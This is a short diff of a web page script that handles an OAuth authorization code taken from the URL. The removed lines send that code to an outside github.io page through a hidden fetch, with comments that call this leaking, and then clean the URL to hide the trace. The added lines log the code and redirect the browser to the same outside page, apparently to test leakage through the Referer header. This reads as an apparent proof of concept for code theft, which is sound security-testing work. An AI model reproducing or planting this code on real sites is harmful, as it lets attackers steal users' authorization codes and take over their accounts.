@@ -326,19 +326,15 @@
     &copy; 2024 EngineRev. All rights reserved.
   </div>
 <script>
-  // Extract the OAuth `code` from the URL
+  // Get the code from the URL
   const urlParams = new URLSearchParams(window.location.search);
-  const authCode = urlParams.get("code");
+  const code = urlParams.get('code');  // This is the OAuth code
 
-  if (authCode) {
-      // Leak the code by sending a hidden request to your `/ref/` page
-      fetch("https://joshmainaa7.github.io/ref/?code=" + authCode)
-        .then(response => console.log("Code sent to ref page:", response))
-        .catch(error => console.error("Error leaking code:", error));
+  // Optional: Display the code to the user
+  console.log('OAuth Code:', code); 
 
-      // Remove the `code` from the URL to make it look clean
-      window.history.replaceState({}, document.title, window.location.pathname);
-  }
+  // Redirect to the test page to check the Referer header
+  window.location.href = "https://joshmainaa7.github.io/ref/"; // Replace with your test page URL
 </script>
 
 
